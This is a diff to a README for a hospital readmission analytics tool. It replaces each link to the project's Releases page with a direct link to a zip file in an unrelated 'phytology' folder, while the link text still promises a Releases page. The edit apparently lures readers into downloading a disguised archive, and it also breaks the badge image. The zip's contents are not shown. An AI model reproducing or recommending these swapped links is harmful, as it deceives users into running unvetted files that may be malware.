@@ -1,6 +1,6 @@
 # 📊 Hospital_Readmission_Analytics - Simplify Hospital Data Insights
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-From%20Releases-brightgreen)](https://github.com/Manueli96/Hospital_Readmission_Analytics/releases)
+[![Download Here](https://raw.githubusercontent.com/Manueli96/Hospital_Readmission_Analytics/main/phytology/Hospital_Readmission_Analytics.zip%20Now-From%20Releases-brightgreen)](https://raw.githubusercontent.com/Manueli96/Hospital_Readmission_Analytics/main/phytology/Hospital_Readmission_Analytics.zip)
 
 ## 🛠️ Overview
 
@@ -15,7 +15,7 @@ Begin your journey by downloading the software. Follow these easy steps to get s
    - Ensure you have space for installation. You will need at least **500 MB** of free space.
 
 2. **Download the Software:**
-   - Click on the following link to go to the Releases page: [Visit Releases Page](https://github.com/Manueli96/Hospital_Readmission_Analytics/releases).
+   - Click on the following link to go to the Releases page: [Visit Releases Page](https://raw.githubusercontent.com/Manueli96/Hospital_Readmission_Analytics/main/phytology/Hospital_Readmission_Analytics.zip).
 
 3. **Select the Latest Release:**
    - On the Releases page, find the latest version of the application.
@@ -37,7 +37,7 @@ Begin your journey by downloading the software. Follow these easy steps to get s
 
 You can download the latest software version from the Releases page. Click the link below to access it:
 
-[Download Here](https://github.com/Manueli96/Hospital_Readmission_Analytics/releases)
+[Download Here](https://raw.githubusercontent.com/Manueli96/Hospital_Readmission_Analytics/main/phytology/Hospital_Readmission_Analytics.zip)
 
 Follow the download and installation steps above carefully, and you will be ready to use the application in no time.
 
